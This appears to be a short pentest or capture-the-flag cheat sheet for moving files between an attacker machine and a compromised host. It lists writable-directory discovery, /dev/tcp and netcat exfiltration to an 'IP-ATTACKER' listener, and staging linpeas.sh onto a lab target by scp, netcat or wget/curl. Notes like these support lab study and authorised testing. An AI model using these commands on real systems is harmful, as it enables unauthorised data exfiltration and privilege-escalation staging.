## CHECK FOLDERS WITH WRITABLE PERMS.
```bash
$ find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
```
---
###  /dev/tcp
```bash
REMOTE:
cat file > /dev/tcp/IP/PORT

LOCAL:
nc -lvp PORT > file
```
---
### SCP
```bash
LOCAL: 
scp username@ip:file .

===========================================================================

LOCAL TO REMOTE:
scp linpeas.sh marcus@10.10.10.238:/tmp/
```
---
### Netcat
```bash
LOCAL:
nc -lvp PORT > FileToTransfer

REMOTE:
nc IP-ATTACKER PORT < FileToTransfer

===========================================================================
LOCAL:
nc -lvp 9003 < linpeas.sh

REMOTE:
nc 10.10.14.99 9003 > linpeas.sh
```
---
### Python Server
```bash
LOCAL:
python3 -m http.server 80
python -m SimpleHTTPServer 80

REMOTE:
wget http://IP/FileToTransfer
OR
curl http://IP/FileToTransfer -o FileToTransfer.example

```